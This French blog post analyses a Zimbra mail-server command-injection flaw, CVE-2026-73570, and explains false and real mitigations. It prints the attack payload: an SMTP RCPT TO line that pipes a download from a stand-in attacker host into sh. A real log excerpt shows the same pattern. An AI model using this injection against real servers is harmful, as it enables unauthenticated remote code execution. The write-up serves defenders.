@@ -1,0 +1,402 @@
+=======================================================
+CVE-2026-73570 : quand Zimbra exécute vos mails rejetés
+=======================================================
+
+Le 2026-08-29 / Tags : securite, informatique, system
+
+
+CVE-2026-73570 : QUAND ZIMBRA EXÉCUTE VOS MAILS REJETÉS
+=======================================================
+
+Il faut bien suivre la tendance. Grosses faille de sécurité, on doit
+rechercher et comprendre. Car visiblement cette jolie petite faille ne
+sort pas de nulle part et a été corrigée bien avant son annonce
+officielle.
+
+
+La faille en question, c'est la CVE-2026-73570. Ce qui la rend
+intéressante — et dangereuse —, c'est qu'elle exploite un mécanisme que
+personne ne surveille : la journalisation (sauf si vous passez vos
+journées desssus). Le mail est rejeté, il n'arrive jamais dans une
+boîte, et pourtant le serveur exécute le payload. C'est contre-intuitif,
+et c'est exactement pour ça que ça marche si bien.
+
+Je vais vous expliquer concrètement comment ça fonctionne, quel est le
+vrai point d'entrée (parce que le nom de la CVE est trompeur), et
+comment corriger le tout — en évitant les faux remèdes qui donnent une
+illusion de sécurité pendant que le serveur continue de saigner.
+
+
+
+
+La bête en bref
+---------------
+
+
+|                     |                                                                            |
+| ------------------- | -------------------------------------------------------------------------- |
+| Identifiant         | CVE-2026-73570 — CWE-78 (injection de commande OS)                         |
+| Score               | CVSS 3.1 : 8.9 (élevé)                                                     |
+| Authentification    | **aucune**                                                                 |
+| Versions affectées  | toutes les ZCS antérieures à 10.1.20                                       |
+| Correctif           | ZCS 10.1.20, publié le 20 juillet 2026                                     |
+| Branche 8.8.15      | **aucun correctif — et il n'y en aura pas**                                |
+| Exploitation active | confirmée par CERT Polska (17/08/2026), puis ajoutée au catalogue CISA KEV |
+
+
+Une faille non authentifiée, Remote Code Execution (RCE pour les
+intimes), sur un serveur mail exposé sur Internet. Le CVSS à 8.9 et non
+10, c'est uniquement parce que le vecteur d'attaque est « high
+complexity » au sens CVSS — le payload doit respecter un format précis
+pour déclencher la regex. Mais une fois le PoC public, la complexité ne
+veut plus rien dire.
+
+
+Le point d'entrée : ce n'est pas SNMP, c'est le logger
+------------------------------------------------------
+
+C'est le premier piège. La CVE s'appelle « SNMP Notification Command
+Injection ». Tous les articles, tous les bulletins, disent : c'est SNMP.
+Tu cherches SNMP, tu désactives SNMP, tu retires SNMP. Sauf que le code
+vulnérable n'est pas dans le service SNMP.
+
+La chaîne vulnérable appartient au service logger. Plus précisément au
+binaire swatchdog (alias zmswatch) qui est un démon de surveillance de
+logs, lancé par logger. Ce démon lit /var/log/zimbra.log en temps réel,
+cherche des motifs, et déclenche des actions — dont des notifications
+SNMP.
+
+Le service snmp (le démon snmpd) n'a aucun rôle dans l'exploitation. Il
+n'a même pas besoin d'être démarré.
+
+
+>>> INFO :
+Quand tu lis « SNMP notification processing » dans le bulletin,
+comprends : « swatchdog génère des traps SNMP quand il voit certains
+motifs dans les logs ». Le mot SNMP décrit la destination de la
+notification, pas le composant vulnérable. Le composant vulnérable,
+c'est swatchdog, qui appartient à logger.
+
+
+
+Le mécanisme, pas à pas
+-----------------------
+
+La chaîne d'exploitation comporte quatre maillons. Aucun n'est
+compliqué, c'est leur enchaînement qui est retords.
+
+
+- Maillon 1 — L'attaquant envoie un mail piégé
+
+L'attaquant se connecte au port 25 (ou 465/587) et soumet une enveloppe
+SMTP dont l'adresse du destinataire contient un payload shell déguisé :
+
+
+    --- code ---
+    RCPT TO:<x: Service status change: localhost x;curl -s http://attaquant/ksmd | sh;curl -s http://attaquant/payload; echo changed from stopped to running@inj.local>
+
+
+Le format n'est pas aléatoire. Il imite exactement la syntaxe que
+swatchdog surveille : Service status change: <host> <service> changed
+from stopped to running. C'est le motif que Zimbra écrit dans ses logs
+quand un service redémarre. L'attaquant forge une ligne de log qui
+ressemble à un changement d'état légitime.
+
+
+- Maillon 2 — Postfix rejette, mais journalise
+
+L'adresse est syntaxiquement invalide. Postfix la rejette avec un
+warning: Illegal address syntax. Jusque-là, tout va bien, le mail n'est
+pas livré.
+
+Sauf que Postfix journalise la tentative dans /var/log/zimbra.log. Et la
+ligne journalisée contient le payload en clair :
+
+
+    --- code ---
+    postfix/smtpd[61594]: warning: Illegal address syntax from [...] in RCPT TO <x: Service status change: localhost x;curl -s http://attaquant/ksmd | sh; ...>
+
+
+C'est ce maillon qui rend la faille non authentifiée et insensible au
+rejet. Tu n'as pas besoin que le mail soit accepté. Tu n'as pas besoin
+d'un compte valide. Tu as juste besoin que Postfix écrive la ligne dans
+le log. Ce qu'il fait systématiquement, même en rejetant.
+
+
+- Maillon 3 — swatchdog lit le log et matche le motif
+
+swatchdog tail /var/log/zimbra.log. Il applique une regex :
+
+
+    --- code perl ---
+    if (/: Service status change: (\S+) (.*) changed from stopped to running/) {
+        donotify('HOST' => "$1", 'SERVICE' => "$2", ...);
+    }
+
+| oui je suis allé loin, je la trouve géniale cette faille
+
+La ligne de log forgée par l'attaquant contient Service status change:
+localhost x;curl ... suivi de changed from stopped to running. La regex
+matche. $1 capture localhost, $2 capture tout le reste — y compris le
+;curl -s http://attaquant/ksmd | sh.
+
+
+- Maillon 4 — Exécution via les backticks Perl
+
+La fonction donotify construit une commande snmptrap et l'exécute avec
+des backticks Perl :
+
+
+    --- code perl ---
+    sub dosnmp {
+        `$snmptrap $snmpsvctrap $snmpsvcname s $args{SERVICE} ...`;
+    }
+
+
+Les backticks en Perl passent la chaîne à /bin/sh -c. Le shell reçoit
+quelque chose comme :
+
+
+    --- code ---
+    snmptrap ... s x;curl -s http://attaquant/ksmd | sh;curl -s http://attaquant/payload; echo ...
+
+
+Le ; termine la commande snmptrap, et tout ce qui suit s'exécute. Sous
+l'uid zimbra. Sans authentification.
+
+Le fait que snmptrap n'existe pas ou ne soit pas trouvé ne change rien :
+le shell développe les substitutions $( ) avant de chercher
+l'exécutable. La charge s'exécute, puis snmptrap échoue sur un command
+not found sans conséquence pour l'attaquant.
+
+
+Le bug dans le code : un échappement appliqué à la mauvaise variable
+--------------------------------------------------------------------
+
+Ce qui rend la faille particulièrement frustrante, c'est que le
+développeur avait conscience du risque. Le script Perl généré à partir
+de swatchrc contient une ligne d'échappement :
+
+
+    --- code perl ---
+    my $S_ = $_;
+    $S_ =~ s/([;&\(\)\|\^><\$`'\\])/\\$1/g;   # échappe $S_ (une copie)
+
+
+Le problème : cette ligne échappe $S_, une copie de la ligne de log.
+Mais la regex de matching tourne sur $, l'original non échappé. Et c'est
+$ dont on extrait $2, qui part directement dans les backticks.
+
+L'échappement existe. Il est correct. Il protège une variable qui n'est
+jamais utilisée dans la commande. C'est l'équivalent d'un casque posé
+sur le siège passager pendant que le conducteur roule sans ceinture.
+
+
+La preuve sur le serveur : zmswatch.out
+---------------------------------------
+
+Et il est assez marrant de faire tourner un zimbra sur cette version et
+voir des attaques en temps réel. Et en attendant un peu, on trouve des
+lignes sympatiques dans /opt/zimbra/log/zmswatch.out :
+
+
+    --- code ---
+    880:SNMP notification: Aug 26 03:55:34 mail postfix/smtpd[61594]: warning: Illegal address syntax ... <x: Service status change: localhost x;curl -s http://XX.XX.XX.XX/.../ksmd | sh; ...>
+
+
+swatchdog a avalé la ligne de log Postfix elle-même et l'a repassée dans
+son pipeline de notification. Ce n'est pas une hypothèse, c'est écrit
+noir sur blanc dans le fichier du composant vulnérable. Le mail n'a
+jamais été livré — c'est le log qui a servi de canal d'exécution.
+
+
+Les trois faux remèdes
+----------------------
+
+C'est ici que ça devient amusant, dans le sens où ça ne l'est pas du
+tout. La documentation et les premiers retours d'expérience regorgent de
+conseils qui ne marchent pas.
+
+
+- Faux remède n°1 : snmp_notify=no
+
+L'idée : dire à Zimbra de ne plus envoyer de notifications SNMP.
+Logique. Sauf que le script Perl généré recopie la valeur brute :
+
+
+    --- code perl ---
+    $notifications{snmp}="no";
+    ...
+    if ($notifications{snmp}) { dosnmp(%args); }
+
+
+En Perl, toute chaîne non vide autre que "0" est vraie. if ("no") vaut
+vrai. La fonction vulnérable s'exécute quand même.
+
+| Quand j'ai vu ça, je me suis retrouvé à l'école travaillant sur du
+| JS...
+
+Seule la valeur 0 neutralise réellement l'appel :
+
+
+    --- code bash ---
+    su - zimbra -c 'zmlocalconfig -e snmp_notify=0'
+
+
+Et même ça, il faut vérifier dans le script réellement chargé :
+
+
+    --- code bash ---
+    grep 'notifications{snmp}' /opt/zimbra/data/tmp/.swatchdog_script.*
+    # attendu : $notifications{snmp}="0";
+
+
+
+- Faux remède n°2 : purger zimbra-snmp
+
+Le nom de la CVE te dit « SNMP », donc tu retires le paquet SNMP. Sauf
+que dpkg -L zimbra-snmp ne contient que des MIB et des fichiers de
+configuration : zéro exécutable. Le code vulnérable vit ailleurs.
+
+
+| Fichier                            | Paquet propriétaire                                      |
+| ---------------------------------- | -------------------------------------------------------- |
+| `/opt/zimbra/common/bin/swatchdog` | `zimbra-perl-swatchdog`                                  |
+| `/opt/zimbra/common/bin/snmptrap`  | `zimbra-net-snmp`                                        |
+| `/opt/zimbra/conf/swatchrc`        | **aucun** — régénéré à chaque démarrage de `logger`      |
+| `zimbra-snmp`                      | MIB + fichiers de conf uniquement, aucun code exécutable |
+
+
+Purger zimbra-snmp retire de la documentation. La chaîne vulnérable
+reste intègre.
+
+
+- Faux remède n°3 : purger zimbra-perl-swatchdog
+
+OK, donc on purge le bon paquet. Sauf que :
+
+
+    --- code ---
+    zimbra-perl-swatchdog → zimbra-perl → zimbra-core → ...
+
+
+Une simulation apt-get -s purge zimbra-perl-swatchdog annonce la
+suppression de 30 paquets, dont zimbra-core, zimbra-store, zimbra-mta et
+zimbra-ldap. C'est-à-dire l'installation Zimbra complète. Tu corriges la
+faille en désinstallant Zimbra. C'est radical, mais pas exactement ce
+qu'on appelle une mitigation.
+
+
+Ce qui ferme réellement le vecteur
+----------------------------------
+
+Par ordre de robustesse, sur une 8.8.15 sans correctif :
+
+
+| Levier                 | Effet                          | Tenue                                   |
+| ---------------------- | ------------------------------ | --------------------------------------- |
+| `logger` désactivé     | `swatchdog` ne tourne pas      | totale tant que le service reste arrêté |
+| `snmp_notify=0`        | `dosnmp` jamais appelée        | dépend de la régénération du script     |
+| neutraliser le binaire | le démon ne peut plus démarrer | totale, réversible                      |
+
+
+La correction propre, si tu es sur 10.x :
+
+
+    --- code bash ---
+    su - zimbra -c 'zmcontrol -v'   # vérifie ta version
+    # Si < 10.1.20 : mettre à jour
+
+
+Le contournement sur 8.8.15 (branche sans correctif) :
+
+Désactiver le service logger pour que swatchdog ne démarre plus :
+
+
+    --- code bash ---
+    # Retirer logger des services activés
+    su - zimbra -c 'zmprov -l ms $(zmhostname) -zimbraServiceEnabled logger'
+    
+    # Arrêter le service immédiatement
+    su - zimbra -c 'zmloggerctl stop'
+    
+    # Vérifier que swatchdog ne tourne plus
+    pgrep -af 'zmswatch|swatchdog'
+    # Ne doit rien renvoyer, ou uniquement le swatchdog du logger (logswatchrc)
+
+
+En ceinture et bretelles, neutraliser le binaire (réversible, au cas où
+zmconfigd le relance) :
+
+
+    --- code bash ---
+    mv /opt/zimbra/common/bin/swatchdog /opt/zimbra/common/bin/swatchdog.disabled
+
+
+Et au niveau réseau, si le serveur n'a pas besoin de recevoir du mail
+directement depuis Internet (il est derrière un relais/proxy mail),
+bloquer 25/465/587 au pare-feu empêche l'attaquant d'atteindre le
+vecteur d'entrée.
+
+
+>>> ATTENTION :
+Désactiver logger a des conséquences : plus de statistiques de volume,
+plus de graphes dans la console d'administration, plus de monitoring
+d'état des services. Sur une 8.8.15 en fin de vie, la vraie réponse
+reste la migration vers 10.1.20+ — ou vers une autre solution.
+
+
+
+Patcher ne suffit pas : assume compromise
+-----------------------------------------
+
+Si ton serveur était exposé et vulnérable, le correctif ferme la porte
+d'entrée. Il ne vérifie pas qui est déjà à l'intérieur.
+
+Visiblement, les attaques se concentrent sur :
+
+- Des webshells JSP dans le webroot Jetty (dynamic.jsp), accessibles en
+  HTTP
+- Un cryptominer XMRig tournant, déguisé en /bin/idle
+- Des clés SSH dans authorized_keys pour un accès persistant
+- Une escalade root via sudo, avec des commandes exécutées en tant que
+  root
+
+L'attaquant qui a eu du code sous zimbra a eu accès aux credentials
+LDAP, aux clés de chiffrement, aux mailboxes. Patcher empêche la
+ré-entrée par la porte CVE-2026-73570, pas par celles qu'il a percées
+derrière.
+
+La réponse honnête quand une instance vulnérable était exposée :
+reconstruction depuis une installation neuve + rotation de tous les
+secrets, pas nettoyage. Un serveur que tu nettoies, c'est un serveur où
+tu espères avoir tout trouvé. Un serveur que tu reconstruis, c'est un
+serveur dont tu sais qu'il est propre.
+
+
+En résumé
+---------
+
+La faille est élégante dans sa simplicité : pas besoin de compte, pas
+besoin que le mail soit accepté, juste besoin que Postfix écrive une
+ligne dans un log et que swatchdog la lise. Le seul échappement prévu
+protège la mauvaise variable. Le nom de la CVE pointe vers le mauvais
+service. Les trois remèdes les plus intuitifs ne marchent pas ou
+détruisent l'installation.
+
+Les points à retenir :
+
+- Le vecteur d'entrée est le port SMTP (25/465/587), mais le composant
+  vulnérable est swatchdog, qui appartient au service logger, pas snmp.
+- Le rejet SMTP ne protège pas : la journalisation suffit.
+- snmp_notify=no ne protège pas : en Perl, "no" est vrai. Il faut 0.
+- Purger zimbra-snmp ne fait rien, purger zimbra-perl-swatchdog
+  désinstalle Zimbra.
+- La correction : mise à jour vers 10.1.20. Sur 8.8.15 : désactiver
+  logger, neutraliser le binaire, et filtrer les ports SMTP au pare-feu.
+- Si le serveur était exposé : assume compromise, reconstruis.
+
+Sources : bulletin Zimbra
+(https://wiki.zimbra.com/wiki/Security_Center), CERT Polska
+(https://moje.cert.pl/komunikaty/2026/145/aktywnie-wykorzystywana-podatnosc-w-zimbra-collaboration-suite/),
+GHSA-jqh7-pchh-v74j (https://github.com/advisories/GHSA-jqh7-pchh-v74j).
